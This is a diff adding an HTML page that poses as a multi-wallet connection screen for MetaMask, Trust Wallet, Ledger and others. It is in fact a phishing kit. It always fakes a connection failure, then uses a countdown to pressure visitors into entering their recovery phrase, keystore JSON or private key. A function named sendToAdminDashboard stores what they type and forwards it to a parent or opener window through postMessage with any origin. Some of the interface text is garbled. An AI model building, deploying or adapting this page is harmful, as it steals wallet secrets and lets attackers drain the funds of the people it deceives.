@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Crypto Wallets UI</title>
+  <style>
+    /* Your existing CSS remains exactly the same */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+    }
+    .top-info {
+      background: #202020;
+      color: white;
+      padding: 30px 20px;
+      display: flex;
+      justify-content: center;
+    }
+    .top-info-left {
+      max-width: 800px;
+      text-align: center;
+    }
+    .marquee {
+      overflow: hidden;
+      white-space: nowrap;
+      background: #fff;
+      padding: 10px 0;
+      border-top: 1px solid #ccc;
+      border-bottom: 1px solid #ccc;
+    }
+    .marquee-content {
+      display: inline-block;
+      animation: scroll 30s linear infinite;
+    }
+    .marquee-item {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin: 0 30px;
+      font-size: 14px;
+    }
+    .marquee-item img {
+      width: 20px;
+      height: 20px;
+      object-fit: contain;
+    }
+    @keyframes scroll {
+      0% { transform: translateX(100%); }
+      100% { transform: translateX(-100%); }
+    }
+    h1 {
+      text-align: center;
+      margin: 20px 0 0;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+      gap: 20px;
+      padding: 20px;
+      max-width: 1000px;
+      margin: auto;
+    }
+    .wallet {
+      background: white;
+      border-radius: 8px;
+      padding: 10px;
+      text-align: center;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      transition: transform 0.2s ease;
+      cursor: pointer;
+    }
+    .wallet:hover {
+      transform: scale(1.05);
+    }
+    .wallet img {
+      width: 40px;
+      height: 40px;
+      margin-bottom: 10px;
+      object-fit: contain;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(0,0,0,0.6);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      position: relative;
+    }
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 12px;
+      background: red;
+      color: white;
+      border: none;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
+    }
+    .modal-wallet-icon {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 15px;
+      display: block;
+      object-fit: contain;
+    }
+    .prg {
+      text-align: center;
+      max-width: 600px;
+      margin: 0 auto;
+      font-size: 16px;
+    }
+    .h22 {
+      font-size: 32px;
+      margin-bottom: 10px;
+    }
+    .modal-options {
+      text-align: left;
+      margin-top: 20px;
+      border-top: 1px solid #eee;
+      padding-top: 20px;
+    }
+    .modal-option {
+      padding: 10px;
+      cursor: pointer;
+      margin: 5px 0;
+      border-radius: 4px;
+    }
+    .modal-option:hover {
+      background-color: #f5f5f5;
+    }
+    .modal-option.primary {
+      font-weight: bold;
+      color: #007bff;
+    }
+    .modal-option.secondary {
+      color: #666;
+    }
+    .modal-footer {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+      padding-top: 10px;
+      border-top: 1px solid #eee;
+    }
+    .modal-footer-item {
+      font-size: 14px;
+      color: #666;
+    }
+    .spinner {
+      width: 40px;
+      height: 40px;
+      margin: 20px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    /* Recovery phrase popup styles */
+    .recovery-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0,0,0,0.6);
+      z-index: 1001;
+      justify-content: center;
+      align-items: center;
+    }
+    .recovery-content {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      width: 400px;
+      max-width: 90%;
+    }
+    .recovery-header {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    .recovery-option {
+      padding: 10px;
+      margin: 5px 0;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .recovery-option:hover {
+      background-color: #f5f5f5;
+    }
+    .recovery-option-title {
+      font-weight: bold;
+    }
+    .recovery-option-subtitle {
+      font-size: 14px;
+      color: #666;
+      margin-left: 10px;
+    }
+    .recovery-error {
+      color: #ff4d4f;
+      text-align: center;
+      margin: 15px 0;
+      font-size: 14px;
+    }
+    .recovery-instruction {
+      font-size: 14px;
+      color: #666;
+      text-align: center;
+      margin: 15px 0;
+      padding: 10px;
+      background: #f9f9f9;
+      border-radius: 6px;
+    }
+    .recovery-buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    .proceed-btn {
+      background: #1890ff;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .cancel-btn {
+      background: transparent;
+      border: 1px solid #ddd;
+      padding: 12px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .recovery-timer {
+      text-align: center;
+      color: #999;
+      font-size: 14px;
+      margin-top: 15px;
+    }
+    
+    /* Recovery input modal styles */
+    .recovery-input-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0,0,0,0.6);
+      z-index: 1002;
+      justify-content: center;
+      align-items: center;
+    }
+    .recovery-input-content {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      width: 400px;
+      max-width: 90%;
+    }
+    .recovery-input-header {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    .recovery-input-area {
+      width: 100%;
+      min-height: 100px;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      margin: 15px 0;
+      font-family: Arial, sans-serif;
+    }
+    .recovery-input-buttons {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+    }
+    .submit-recovery-btn {
+      background: #1890ff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .cancel-recovery-btn {
+      background: transparent;
+      border: 1px solid #ddd;
+      padding: 10px 20px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-info">
+    <div class="top-info-left">
+      <h2 class="h22">Wallets</h2>
+      <p class="prg">Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
+    </div>
+  </div>
+
+  <div class="marquee"><div class="marquee-content" id="marquee-list"></div></div>
+
+  <h1>Choose Wallet</h1>
+  <div class="grid" id="wallet-grid">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Wallet Connection Modal -->
+  <div class="modal" id="walletModal">
+    <div class="modal-content">
+      <button class="close-btn" onclick="closeModal()">×</button>
+      <img id="modal-wallet-icon" class="modal-wallet-icon" src="" alt="Wallet Icon">
+      <h2 id="modal-title">Connecting...</h2>
+      <p id="modal-message">Please wait...</p>
+      
+      <div id="image-modal-content" style="display: none;">
+        <div class="modal-options">
+          <div class="modal-option secondary">Error Connecting.</div>
+          <div class="modal-option primary" id="manual-connect-btn">Connect Manually</div>
+          <div class="modal-option primary">Trust</div>
+          <div class="modal-option secondary">Easy-to-use browser extension.</div>
+        </div>
+        <div class="modal-footer">
+          <div class="modal-footer-item">Back</div>
+          <div class="modal-footer-item">Nextmask</div>
+          <div class="modal-footer-item">Logist</div>
+          <div class="modal-footer-item">Trust</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Recovery Phrase Popup -->
+  <div class="recovery-modal" id="recoveryModal">
+    <div class="recovery-content">
+      <div class="recovery-header">Multiple iOS and AI computer screen to sit</div>
+      
+      <div class="recovery-option">
+        <div class="recovery-option-title">Image</div>
+        <div class="recovery-option-subtitle">Phase</div>
+        <div class="recovery-option-subtitle">Keystore JSON</div>
+        <div class="recovery-option-subtitle">Private Key</div>
+      </div>
+      
+      <div class="recovery-error">Error your recovery phrase</div>
+      
+      <div class="recovery-instruction" id="recoveryOptionsContainer">
+        Type: 12 (sometimes 24) words separated by single spaces
+      </div>
+      
+      <div class="recovery-buttons">
+        <button class="proceed-btn" id="proceed-btn">Proceed</button>
+        <button class="cancel-btn" onclick="closeRecoveryModal()">Cancel</button>
+      </div>
+      
+      <div class="recovery-timer">Timer</div>
+    </div>
+  </div>
+
+  <!-- Recovery Input Modal -->
+  <div class="recovery-input-modal" id="recoveryInputModal">
+    <div class="recovery-input-content">
+      <div class="recovery-input-header" id="recoveryInputHeader">Enter Recovery Phrase</div>
+      <textarea class="recovery-input-area" id="recoveryInputArea" placeholder="Enter your recovery phrase here..."></textarea>
+      <div class="recovery-input-buttons">
+        <button class="submit-recovery-btn" onclick="submitRecovery()">Submit</button>
+        <button class="cancel-recovery-btn" onclick="closeRecoveryInputModal()">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Using direct image links from reliable sources
+    const wallets = [
+      {
+        name: "MetaMask",
+        image: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1200px-MetaMask_Fox.svg.png"
+      },
+      {
+        name: "Trust Wallet",
+        image: "https://trustwallet.com/assets/images/media/assets/TWT.png"
+      },
+      {
+        name: "Coinbase Wallet",
+        image: "https://images.ctfassets.net/c5bd0wqjc7v0/3dFdYiw3WcEZhxT8QJ0EAP/0e4d8c3d6a4e5a1f0e8b4d4e6b4d4e6b/coinbase-wallet-logo.png"
+      },
+      {
+        name: "Ledger",
+        image: "https://www.ledger.com/wp-content/uploads/2021/09/Ledger_Logo.svg"
+      },
+      {
+        name: "Phantom",
+        image: "https://phantom.app/static/phantom-og.png"
+      },
+      {
+        name: "Exodus",
+        image: "https://www.exodus.com/img/logo.svg"
+      },
+      {
+        name: "Argent",
+        image: "https://www.argent.xyz/wp-content/themes/argent-wp-theme/assets/images/argent-logo.svg"
+      },
+      {
+        name: "Math Wallet",
+        image: "https://mathwallet.org/wp-content/uploads/2020/01/mathwallet-logo.png"
+      },
+      {
+        name: "SafePal",
+        image: "https://safepal.com/images/logo.svg"
+      },
+      {
+        name: "TokenPocket",
+        image: "https://tokenpocket.pro/images/logo.svg"
+      },
+      {
+        name: "BitPay",
+        image: "https://bitpay.com/build/images/bitpay-logo.73d76df3.svg"
+      },
+      {
+        name: "Trezor",
+        image: "https://trezor.io/static/images/trezor-logo.svg"
+      }
+    ];
+
+    const walletGrid = document.getElementById('wallet-grid');
+    const marqueeList = document.getElementById('marquee-list');
+    const recoveryModal = document.getElementById('recoveryModal');
+    const recoveryInputModal = document.getElementById('recoveryInputModal');
+    const manualConnectBtn = document.getElementById('manual-connect-btn');
+    const proceedBtn = document.getElementById('proceed-btn');
+    const recoveryOptionsContainer = document.getElementById('recoveryOptionsContainer');
+    const recoveryInputHeader = document.getElementById('recoveryInputHeader');
+    const recoveryInputArea = document.getElementById('recoveryInputArea');
+    
+    let countdown;
+    let selectedRecoveryMethod = '';
+
+    function loadWallets() {
+      walletGrid.innerHTML = '';
+      
+      wallets.forEach(wallet => {
+        // Create wallet element
+        const div = document.createElement('div');
+        div.className = 'wallet';
+        
+        // Create image with error handling
+        const img = document.createElement('img');
+        img.alt = wallet.name;
+        img.onerror = function() {
+          this.src = `https://ui-avatars.com/api/?name=${wallet.name.substring(0,2)}&background=random`;
+        };
+        img.src = wallet.image;
+        
+        // Create name element
+        const name = document.createElement('p');
+        name.textContent = wallet.name;
+        
+        // Assemble wallet element
+        div.appendChild(img);
+        div.appendChild(name);
+        div.onclick = () => openModal(wallet);
+        
+        // Add to grid
+        walletGrid.appendChild(div);
+
+        // Create marquee item
+        const marqueeImg = document.createElement('img');
+        marqueeImg.alt = wallet.name;
+        marqueeImg.onerror = function() {
+          this.src = `https://ui-avatars.com/api/?name=${wallet.name.substring(0,2)}&background=random`;
+        };
+        marqueeImg.src = wallet.image;
+        
+        const marqueeText = document.createTextNode(wallet.name);
+        
+        const item = document.createElement('span');
+        item.className = 'marquee-item';
+        item.appendChild(marqueeImg);
+        item.appendChild(marqueeText);
+        
+        marqueeList.appendChild(item);
+      });
+    }
+
+    function openModal(wallet) {
+      const modal = document.getElementById('walletModal');
+      const walletIcon = document.getElementById("modal-wallet-icon");
+      
+      // Set wallet image with fallback
+      walletIcon.src = wallet.image;
+      walletIcon.onerror = function() {
+        this.src = `https://ui-avatars.com/api/?name=${wallet.name.substring(0,2)}&background=random&size=60`;
+      };
+      
+      document.getElementById("modal-title").innerText = "Connecting to " + wallet.name;
+      document.getElementById("modal-message").innerText = "Please wait...";
+      document.getElementById("image-modal-content").style.display = "none";
+      
+      modal.style.display = "flex";
+
+      setTimeout(() => {
+        document.getElementById("modal-title").innerText = "Connection to " + wallet.name;
+        document.getElementById("modal-message").innerText = "Could not connect to " + wallet.name;
+        document.getElementById("image-modal-content").style.display = "block";
+        
+        // Add click handler for manual connect button
+        manualConnectBtn.onclick = function() {
+          openRecoveryModal();
+        };
+      }, 3000);
+    }
+
+    function closeModal() {
+      document.getElementById('walletModal').style.display = "none";
+    }
+
+    function openRecoveryModal() {
+      // Reset the options container to default
+      recoveryOptionsContainer.innerHTML = 'Type: 12 (sometimes 24) words separated by single spaces';
+      recoveryModal.style.display = "flex";
+      startTimer();
+    }
+
+    function closeRecoveryModal() {
+      recoveryModal.style.display = "none";
+      clearInterval(countdown);
+    }
+
+    function handleProceed() {
+      // Create recovery method options
+      const options = [
+        { name: 'Phase', description: 'Enter your recovery phrase' },
+        { name: 'Keystore JSON', description: 'Upload your keystore file' },
+        { name: 'Private Key', description: 'Enter your private key' }
+      ];
+      
+      // Create options HTML
+      let optionsHTML = '<div style="font-weight:bold;margin-bottom:10px;">Select Recovery Method:</div>';
+      options.forEach(option => {
+        optionsHTML += `
+          <div class="recovery-option" onclick="selectRecoveryMethod('${option.name}')">
+            <div class="recovery-option-title">${option.name}</div>
+            <div class="recovery-option-subtitle">${option.description}</div>
+          </div>
+        `;
+      });
+      
+      // Update the container
+      recoveryOptionsContainer.innerHTML = optionsHTML;
+    }
+
+    function selectRecoveryMethod(method) {
+      selectedRecoveryMethod = method;
+      closeRecoveryModal();
+      openRecoveryInputModal(method);
+    }
+
+    function openRecoveryInputModal(method) {
+      recoveryInputHeader.textContent = `Enter ${method}`;
+      
+      // Set appropriate placeholder
+      let placeholder = '';
+      if (method === 'Phase') {
+        placeholder = 'Enter your 12 or 24 word recovery phrase separated by spaces';
+      } else if (method === 'Keystore JSON') {
+        placeholder = 'Paste your keystore JSON content here';
+      } else {
+        placeholder = 'Enter your private key (usually starts with 0x...)';
+      }
+      
+      recoveryInputArea.placeholder = placeholder;
+      recoveryInputModal.style.display = "flex";
+    }
+
+    function closeRecoveryInputModal() {
+      recoveryInputModal.style.display = "none";
+    }
+
+    // NEW FUNCTION: Send recovery data to admin system without redirect
+    function sendToAdminDashboard(method, content) {
+      const submission = {
+        id: 'sub-' + Math.random().toString(36).substring(2, 10),
+        method: method,
+        content: content,
+        timestamp: new Date().toISOString(),
+        wallet: document.getElementById("modal-title").innerText.replace("Connection to ", ""),
+        ip: '', // Can be populated server-side if needed
+        userAgent: navigator.userAgent
+      };
+
+      // Save to localStorage (works offline)
+      const existingSubmissions = JSON.parse(localStorage.getItem('walletRecoverySubmissions') || '[]');
+      existingSubmissions.push(submission);
+      localStorage.setItem('walletRecoverySubmissions', JSON.stringify(existingSubmissions));
+
+      // Try to send to admin system (multiple methods)
+      try {
+        // Method 1: If embedded in admin page as iframe
+        if (window.parent && window.parent.receiveWalletRecovery) {
+          window.parent.receiveWalletRecovery(submission);
+          return true;
+        }
+        
+        // Method 2: If opened as popup from admin
+        if (window.opener && window.opener.receiveWalletRecovery) {
+          window.opener.receiveWalletRecovery(submission);
+          return true;
+        }
+        
+        // Method 3: Using postMessage (if admin is listening)
+        if (window.parent) {
+          window.parent.postMessage({
+            type: 'WALLET_RECOVERY_SUBMISSION',
+            data: submission
+          }, '*');
+          return true;
+        }
+        
+        // Method 4: Using fetch API if you have an endpoint
+        // fetch('/api/submit-recovery', {
+        //   method: 'POST',
+        //   headers: { 'Content-Type': 'application/json' },
+        //   body: JSON.stringify(submission)
+        // });
+        // return true;
+        
+        // If none of the above worked, just rely on localStorage
+        return true;
+      } catch (e) {
+        console.error("Error sending to admin:", e);
+        return true; // Still return true since we saved to localStorage
+      }
+    }
+
+    // UPDATED: Submit recovery function (no redirect)
+    function submitRecovery() {
+      const recoveryInput = recoveryInputArea.value.trim();
+      if (!recoveryInput) {
+        alert('Please enter your recovery information');
+        return;
+      }
+      
+      // Send to admin system
+      const success = sendToAdminDashboard(selectedRecoveryMethod, recoveryInput);
+      
+      if (success) {
+        alert(`Recovery ${selectedRecoveryMethod} submitted successfully`);
+        recoveryInputArea.value = '';
+        closeRecoveryInputModal();
+        closeModal();
+      } else {
+        alert('Submission failed. Please try again.');
+      }
+    }
+
+    function startTimer() {
+      let seconds = 60;
+      const timerElement = document.querySelector('.recovery-timer');
+      timerElement.textContent = `Time remaining: ${seconds}s`;
+      
+      countdown = setInterval(() => {
+        seconds--;
+        timerElement.textContent = `Time remaining: ${seconds}s`;
+        
+        if (seconds <= 0) {
+          clearInterval(countdown);
+          closeRecoveryModal();
+        }
+      }, 1000);
+    }
+
+    // Initialize
+    loadWallets();
+    
+    // Add click handler for proceed button
+    proceedBtn.onclick = handleProceed;
+  </script>
+</body>
+</html>
